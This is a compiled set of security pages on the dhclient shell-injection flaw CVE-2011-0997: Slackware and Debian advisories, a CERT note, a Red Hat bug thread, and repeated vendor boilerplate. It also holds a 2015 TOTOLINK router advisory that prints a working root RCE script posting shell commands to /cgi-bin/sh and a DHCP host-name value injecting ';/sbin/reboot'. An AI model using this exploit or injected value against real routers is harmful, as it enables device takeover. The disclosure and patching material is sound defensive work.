Here are the details from the Slackware 13.1 ChangeLog: +--------------------------+ patches/packages/dhcp-4.1_ESV_R2-i486-1_slack13.1.txz:  Upgraded.   In dhclient, check the data for some string options for reasonableness   before passing it along to the script that interfaces with the OS.   This prevents some possible attacks by a hostile DHCP server.   For more information, see:     http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0997   (* Security fix *) +--------------------------+   Where to find the new packages: +-----------------------------+  HINT:  Getting slow download speeds from ftp.slackware.com? Give slackware.osuosl.org a try.  This is another primary FTP site for Slackware that can be considerably faster than downloading directly from ftp.slackware.com.  Thanks to the friendly folks at the OSU Open Source Lab (http://osuosl.org) for donating additional FTP and rsync hosting to the Slackware project!  :-)  Also see the "Get Slack" section on http://slackware.com for additional mirror sites near you.

## Advisory Information

Title: 15 TOTOLINK router models vulnerable to multiple RCEs
Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x00.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html
Date published: 2015-07-16
Vendors contacted: None
Release mode: 0days, Released
CVE: no current CVE

## Product Description

TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO
markets in South Korea.
TOTOLINK produces routers routers, wifi access points and network
devices. Their products are sold worldwide.

## Vulnerabilities Summary

The first vulnerability allows to bypass the admin authentication and
to get a direct RCE from the LAN side with a single HTTP request.

The second vulnerability allows to bypass the admin authentication and
to get a direct RCE from the LAN side with a single DHCP request.

There are direct RCEs against the routers which give a complete root
access to the embedded Linux from the LAN side.

The two RCEs affect 13 TOTOLINK products from 2009-era firmwares to
the latest firmwares with the default configuration:

- TOTOLINK A1004 : until last firmware (9.34 - za1004_en_9_34.bin)
- TOTOLINK A5004NS : until last firmware (9.38 - za5004s_en_9_38.bin)
- TOTOLINK EX300 : until last firmware (8.68 - TOTOLINK EX300_8_68.bin
- totolink.net)
- TOTOLINK EX300 : until last firmware (9.36 -
ex300_ch_9_36.bin.5357c0 - totolink.cn)
- TOTOLINK N150RB : until last firmware (9.08 - zn150rb_en_9_08.bin.5357c0)
- TOTOLINK N300RB : until last firmware (9.26 - zn300rb_en_9_26.bin)
- TOTOLINK N300RG : until last firmware (8.70 - TOTOLINK N300RG_8_70.bin)
- TOTOLINK N500RDG : until last firmware (8.42 - TOTOLINK N500RDG_en_8_42.bin)
- TOTOLINK N600RD : until last firmware (8.64 - TOTOLINK N600RD_en_8_64.bin)
- TOTOLINK N302R Plus V1 : until the last firmware 8.82 (TOTOLINK
N302R Plus V1_en_8_82.bin)
- TOTOLINK N302R Plus V2 : until the last firmware 9.08 (TOTOLINK
N302R Plus V2_en_9_08.bin)
- TOTOLINK A3004NS (no firmware available in totolinkusa.com but
ipTIME's A3004NS model was vulnerable to the 2 RCEs)
- TOTOLINK EX150 : until the last firmware (8.82 - ex150_ch_8_82.bin.5357c0)

The DHCP RCE also affects 2 TOTOLINK products from 2009-era firmwares
to the latest firmwares with the default configuration:

- TOTOLINK A2004NS : until last firmware (9.60 - za2004s_en_9_60.bin)
- TOTOLINK EX750 : until last firmware (9.60 - ex750_en_9_60.bin)

Firmwares come from totolink.net and from totolink.cn.

- - From my tests, it is possible to use these vulnerabilities to
overwrite the firmware with a custom (backdoored) firmware.

Concerning the high CVSS score (10/10) of the vulnerabilities and the
longevity of this vulnerability (6+ year old),
the TOTOLINK users are urged to contact TOTOLINK.

## Details - RCE with a single HTTP request

The HTTP server allows the attacker to execute some CGI files.

Many of them are vulnerable to a command inclusion which allows to
execute commands with the http daemon user rights (root).

Exploit code:

$ cat totolink.carnage
#!/bin/sh
if [ ! $1 ]; then
echo "Usage:"
echo $0 ip command
exit 1
fi
wget -qO- --post-data="echo 'Content-type:
text/plain';echo;echo;PATH=$PATH:/sbin $2 $3 $4" http://$1/cgi-bin/sh

The exploits have been written in HTML/JavaScript, in form of CSRF
attacks, allowing people to test their systems in live using their
browsers:

o Brick the device:

HTML/JS exploits:

An attacker can use the /usr/bin/wget binary located in the file
system of the remote device to plant a backdoor and then execute it as
root.

By the way, d.cgi in /bin/ is an intentional backdoor.

## Details - RCE with a single DHCP request

This vulnerability is the exact inverse of CVE-2011-0997. The DHCPD
server in TOTOLINK devices allows remote attackers to execute
arbitrary commands
via shell metacharacters in the host-name field.

Sending a DHCP request with this parameter will reboot the device:

cat /etc/dhcp/dhclient.conf

send host-name ";/sbin/reboot";

When connecting to the UART port (`screen /dev/ttyUSB0 38400`), we
will see the stdout of the /dev/console device;
the dhcp request will immediately force the reboot of the remote device:

An attacker can use the /usr/bin/wget binary located in the file
system of the remote device to plant a backdoor and then execute it as
root.

## Vendor Response

Due to "un-ethical code" found in TOTOLINK products (= backdoors found
in new TOTOLINK devices), TOTOLINK was not contacted in regard of this
case, but ipTIME was contacted in April 2015 concerning the first RCE.

## Report Timeline

* Jun 01, 2014: First RCE found by Pierre Kim and Alexandre Torres in
ipTIME products.
* Jun 02, 2014: Second RCE found by Pierre Kim in ipTIME products.
* Jun 25, 2015: Similar vulnerabilities found in TOTOLINK products.
* Jul 13, 2015: TOTOLINK silently fixed the HTTP RCE in A2004NS and
EX750 routers.
* Jul 13, 2015: Updated firmwares confirmed vulnerable.
* Jul 16, 2015: A public advisory is sent to security mailing lists.

compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Debian Security Advisory DSA-2217-1                   security@debian.org
<http://www.debian.org/security/>                                Nico Golde
April 10, 2011                         <http://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : dhcp3
Vulnerability  : missing input sanitization
Problem type   : remote
Debian-specific: no
CVE ID         : CVE-2011-0997

Sebastian Krahmer and Marius Tomaschewski discovered that dhclient of
dhcp3, a DHCP client, is not properly filtering shell meta-characters
in certain options in DHCP server responses.  These options are reused in
an insecure fashion by dhclient scripts.  This allows an attacker to execute
arbitrary commands with the privileges of such a process by sending crafted
DHCP options to a client using a rogue server.

For the oldstable distribution (lenny), this problem has been fixed in
version 3.1.1-6+lenny5.

For the stable (squeeze), testing (wheezy) and unstable (sid) distributions,
this problem has been fixed in an additional update for isc-dhcp.

We recommend that you upgrade your dhcp3 packages.

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <http://www.debian.org/security/>

Debian Security Advisory DSA-2216-1                   security@debian.org
<http://www.debian.org/security/>                                Nico Golde
April 10, 2011                         <http://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : isc-dhcp
Vulnerability  : missing input sanitization
Problem type   : remote
Debian-specific: no
CVE ID         : CVE-2011-0997
Debian bug     : 621099

Sebastian Krahmer and Marius Tomaschewski discovered that dhclient of
isc-dhcp, a DHCP client, is not properly filtering shell meta-characters
in certain options in DHCP server responses.  These options are reused in
an insecure fashion by dhclient scripts.  This allows an attacker to execute
arbitrary commands with the privileges of such a process by sending crafted
DHCP options to a client using a rogue server.

For the oldstable distribution (lenny), this problem has been fixed in
additional update for dhcp3.

For the stable distribution (squeeze), this problem has been fixed in
version 4.1.1-P1-15+squeeze2.

For the testing distribution (wheezy), this problem will be fixed soon.

For the unstable distribution (sid), this problem has been fixed in
version 4.1.1-P1-16.1.

We recommend that you upgrade your isc-dhcp packages.

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <http://www.debian.org/security/>

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

## ISC dhclient vulnerability

#### Vulnerability Note VU#107886

Original Release Date: 2011-04-05 | Last Revised: 2011-05-06

---

### Overview

The ISC dhclient contains a vulnerability that could allow a remote attacker to execute arbitrary code on the client machine.

### Description

| According to [ISC](https://www.isc.org/software/dhcp/advisories/cve-2011-0997):  *ISC dhclient did not strip or escape certain shell meta-characters in responses from the dhcp server (like hostname) before passing the responses on to dhclient-script. Depending on the script and OS, this can result in execution of exploit code on the client.* |
| --- |

### Impact

| An unauthenticated remote attacker could cause the ISC dhclient to execute arbitrary code on the client machine. |
| --- |

### Solution

| **Apply an update**Users who obtain ISC DHCP from a third-party vendor, such as their operating system vendor, should see the vendor information portion of this document for a partial list of affected vendors.This vulnerability is addressed in ISC DHCP version 3.1-ESV-R1, 4.1-ESV-R2 and 4.2.1-P1. Users of ISC DHCP from the original source distribution should upgrade to this version or later, as appropriate.See also <https://www.isc.org/software/dhcp/advisories/cve-2011-0997> |
| --- |

| According to ISC:*On SUSE systems, it is possible to disable hostname update by setting DHCLIENT\_SET\_HOSTNAME="no" in /etc/sysconfig/network/dhcp.Other systems may add following line to dhclient-script at the beginning of the set\_hostname() function:new\_host\_name=${new\_host\_name//[^-.a-zA-Z0-9]/}In environments where filters/acls can be put into place to limit clients to accessing only legitimate dhcp servers, this will protect clientsfrom rogue dhcp servers deliberately trying to exploit this bug. However, this will not protect from compromised servers.* |

| [Description](show_bug.cgi?id=689832#c0)  Tomas Hoger    2011-03-22 15:01:48 UTC  ``` Sebastian Krahmer of the SUSE security team noticed that DHCP clients fail to sanitize certain values supplied by DHCP servers during the DHCP communication.  The example of such value is hostname configured on the DHCP client.  Various scripts assume hostname is trusted and do not sufficiently escape or quote it.  Malicious DHCP server can use this to execute arbitrary code on the DHCP client by supplying a specially-crafted hostname.  Acknowledgement:  Red Hat would like to thank Sebastian Krahmer of the SuSE Security Team for reporting this issue.   ```  [Comment 1](show_bug.cgi?id=689832#c1)  Tomas Hoger    2011-03-22 15:04:41 UTC  ``` Created [attachment 486815](attachment.cgi?id=486815&action=diff "Proposed patch for ISC dhclient") [[details]](attachment.cgi?id=486815&action=edit "Proposed patch for ISC dhclient") Proposed patch for ISC dhclient  Created by Marius Tomaschewski of SUSE.   ```  [Comment 2](show_bug.cgi?id=689832#c2)  Tomas Hoger    2011-03-22 15:05:19 UTC  ``` Created [attachment 486816](attachment.cgi?id=486816&action=diff "Proposed patch for dhclientv6") [[details]](attachment.cgi?id=486816&action=edit "Proposed patch for dhclientv6") Proposed patch for dhclientv6  Created by Marius Tomaschewski of SUSE.   ```  [Comment 3](show_bug.cgi?id=689832#c3)  Tomas Hoger    2011-03-22 15:06:06 UTC  ``` Created [attachment 486817](attachment.cgi?id=486817&action=diff "Proposed patch for dhcpcd") [[details]](attachment.cgi?id=486817&action=edit "Proposed patch for dhcpcd") Proposed patch for dhcpcd  Created by Marius Tomaschewski of SUSE.   ```  [Comment 4](show_bug.cgi?id=689832#c4)  Tomas Hoger    2011-03-22 15:10:50 UTC  ``` There currently seem to be an ongoing discussion on whether this should be handled in the dhcp clients directly (as proposed by Marius), or rather in dhcp client scripts.   ```  [Comment 5](show_bug.cgi?id=689832#c5)  Tomas Hoger    2011-03-23 10:01:37 UTC  ``` Created [attachment 486993](attachment.cgi?id=486993&action=diff "Updated proposed patch for ISC dhclient") [[details]](attachment.cgi?id=486993&action=edit "Updated proposed patch for ISC dhclient") Updated proposed patch for ISC dhclient   ```  [Comment 6](show_bug.cgi?id=689832#c6)  Tomas Hoger    2011-03-23 10:54:45 UTC  ``` David, if we patch dhclient / dhcp6c using the proposed patch, will we need to do any more work for libdhcp*client and libdhcp we have in EL5?  Are you familiar with how anaconda uses dhclient?  I presume it's via libdhcp{,*client} on EL5, possibly directly on older and newer.   ```  [Comment 7](show_bug.cgi?id=689832#c7)  David Cantrell    2011-03-23 13:55:09 UTC  ``` (In reply to [comment #6](show_bug.cgi?id=689832#c6)) > David, if we patch dhclient / dhcp6c using the proposed patch, will we need to > do any more work for libdhcp*client and libdhcp we have in EL5?  Are you > familiar with how anaconda uses dhclient?  I presume it's via libdhcp{,*client} > on EL5, possibly directly on older and newer.  The only thing we would need to do is probably rebuild libdhcp because there is a static library provided that links with libdhcp4client and libdhcp6client.  libdhcp4client is a patch to the dhcp package that turns dhclient in a library.  libdhcp6client is in the dhcpv6 code that builds dhcp6c as a library.  Both of these are how libdhcp actually gains DHCP functionality, so there's not seperate patching that needs to happen for libdhcp.  We might also want to consider rebuilding anaconda because loader in RHEL-5 is statically linked with libdhcp.  It won't really matter to anyone except people rebuilding installation though.  In anaconda in RHEL-5, we call libdhcp directly for DHCP needs.  libdhcp in turn uses libdhcp4client and libdhcp6client (as described above).  In RHEL-6, libdhcp no longer exists (nor does the dhcpv6 package).  In RHEL-6 anaconda speaks to NetworkManager to handle all networking needs.  NetworkManager runs dhclient directly but provides its own replacement for /sbin/dhclient-script.   ```  [Comment 8](show_bug.cgi?id=689832#c8)  Tomas Hoger    2011-03-23 14:49:55 UTC  ``` (In reply to [comment #7](show_bug.cgi?id=689832#c7)) > We might also want to consider rebuilding anaconda because loader in RHEL-5 is > statically linked with libdhcp.  It won't really matter to anyone except people > rebuilding installation though.  Statically linked loader is the one that can be found on stage1 images, such as boot.iso?  I see stage2 image does have dynamic libdhcp* libs.  Is the final host name set on the system the one obtained during the stage2?  I also see stage2 provides udhcpc -> busybox symlink.  Based on what you said, anaconda does not use busybox dhcp client.   ```  [Comment 9](show_bug.cgi?id=689832#c9)  David Cantrell    2011-03-23 15:59:21 UTC  ``` (In reply to [comment #8](show_bug.cgi?id=689832#c8)) > (In reply to [comment #7](show_bug.cgi?id=689832#c7)) > > We might also want to consider rebuilding anaconda because loader in RHEL-5 is > > statically linked with libdhcp.

I see stage2 image does have dynamic libdhcp* libs.  Is the final > host name set on the system the one obtained during the stage2?  Not necessarily.  If the user is doing a network-based install, then loader from stage1 will set up the network.  If they enable the network in stage2 (e.g., doing a CD or DVD install and adding an additional remote repo during install), then the dynamic libdhcp in stage2 is in charge.  > I also see stage2 provides udhcpc -> busybox symlink.  Based on what you said, > anaconda does not use busybox dhcp client.  That is correct.  Anaconda does not use the busybox dhcp client.   ```  [Comment 10](show_bug.cgi?id=689832#c10)  Tomas Hoger    2011-03-23 16:21:00 UTC  ``` Thank you!  I've noticed that our dhclient-script only tries to set hostname to server provided value if it's unset or set to "localhost" or "localhost.localdomain".  Do you think we can make any assumptions on what the hostname is based on what anaconda does?   ```  [Comment 11](show_bug.cgi?id=689832#c11)  Tomas Hoger    2011-03-24 16:05:07 UTC  ``` For DHCP(v4), there mitigations for specially-crafted hostname are: - dhclient-script only sets server-supplied hostname if there is no hostname   set already (see [comment #10](show_bug.cgi?id=689832#c10) for details) - dhclient already escapes certain special characters (e.g. ` and $), which   blocks the most straight forward attacks, but code execution may still be   possible in certain less common cases  For DHCPv6, the lack of hostname option seems to reduce the risk significantly.  It may be possible to set DNS domain search list to invalid values.   ```  [Comment 14](show_bug.cgi?id=689832#c14)  Tomas Hoger    2011-03-25 16:09:15 UTC  ``` Created [attachment 487590](attachment.cgi?id=487590&action=diff "Proposed ISC patch") [[details]](attachment.cgi?id=487590&action=edit "Proposed ISC patch") Proposed ISC patch  Based on previous patches from Marius Tomaschewski.   ```  [Comment 15](show_bug.cgi?id=689832#c15)  Tomas Hoger    2011-03-25 16:13:34 UTC  ``` Created [attachment 487591](attachment.cgi?id=487591&action=diff "Updated ISC patch from Marius") [[details]](attachment.cgi?id=487591&action=edit "Updated ISC patch from Marius") Updated ISC patch from Marius  Based on patch in [comment #14](show_bug.cgi?id=689832#c14), with few additional changes proposed by Marius.

According to ISC, they are not going to take additional changes proposed by Marius now, as they do not want to respin candidate tarballs now and will be reviewing those changes for the next maintenance update.  Their future solution may differ significantly from the current quick fix.  The patch also has check_domain_name*() functions accept argument dots, which is not really used in this fix and the functions are always called with dots == 0.   ```  [Comment 18](show_bug.cgi?id=689832#c18)  Tomas Hoger    2011-04-01 15:55:20 UTC  ``` Created [attachment 489426](attachment.cgi?id=489426&action=diff "Backport to EL5 dhcp") [[details]](attachment.cgi?id=489426&action=edit "Backport to EL5 dhcp") Backport to EL5 dhcp  Backport of the above patch to dhcp version 3.0.5 as shipped with RHEL-5.

Escaping list was adjusted to match 4.x version too.   ```  [Comment 20](show_bug.cgi?id=689832#c20)  Tomas Hoger    2011-04-05 19:46:50 UTC  ``` Public now via: <http://www.isc.org/software/dhcp/advisories/cve-2011-0997> <http://ftp.isc.org/isc/dhcp/dhcp-4.2.1-P1-RELNOTES> <http://www.kb.cert.org/vuls/id/107886>  Fixed upstream in versions: 3.1-ESV-R1, 4.1-ESV-R2 and 4.2.1-P1   ```  [Comment 21](show_bug.cgi?id=689832#c21)  Tomas Hoger    2011-04-06 09:03:09 UTC  ``` Created dhcp tracking bugs for this issue  Affects: fedora-all [[bug 694005](show_bug.cgi?id=694005 "CLOSED ERRATA - CVE-2011-0997 dhclient: insufficient sanitization of certain DHCP response values [fedora-all]")]   ```  [Comment 22](show_bug.cgi?id=689832#c22)  Tomas Hoger    2011-04-06 15:32:10 UTC  ``` SuSE folks reported that this fix may introduce a regressions in configurations that abuse domain-name option.  This option is documented to only contain single domain name that should be used by the client when resolving host names.  However, due to the way dhclient-script handles this option when generating resolv.conf, it was previously possible to define domain-name option in the dhcpd's configuration as:    option domain-name "domain1.com domain2.com";  and have 'search domain1.com domain2.com' added to the resolv.conf on the client side.  This reportedly work well for Unix dhcp clients (but now Windows dhcp clients) and can be found being recommended in various internet discussions as a solution to the problem of distributing multiple search domains to the DHCP clients.  The patch enforces that the domain-name option value must be a valid domain name and hence does not allow a space in it.  A proposed workaround to preserve a compatibility with such configurations it to check the DHO_DOMAIN_NAME option in the same way as the DHO_DOMAIN_SEARCH, i.e. using check_domain_name_list() rather than check_domain_name().   ```  [Comment 23](show_bug.cgi?id=689832#c23)  Tomas Hoger    2011-04-06 15:46:38 UTC  ``` Created [attachment 490327](attachment.cgi?id=490327&action=diff "Marius' patch making domain-name check more lenient") [[details]](attachment.cgi?id=490327&action=edit "Marius' patch making domain-name check more lenient") Marius' patch making domain-name check more lenient  See previous comment for details.   ```  [Comment 24](show_bug.cgi?id=689832#c24)  errata-xmlrpc    2011-04-08 14:39:22 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 6   Red Hat Enterprise Linux 5   Red Hat Enterprise Linux 4  Via RHSA-2011:0428 <https://rhn.redhat.com/errata/RHSA-2011-0428.html>   ```  [Comment 25](show_bug.cgi?id=689832#c25)  errata-xmlrpc    2011-05-31 14:52:27 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 3 Extended Lifecycle Support  Via RHSA-2011:0840 <https://rhn.redhat.com/errata/RHSA-2011-0840.html>   ``` |  |
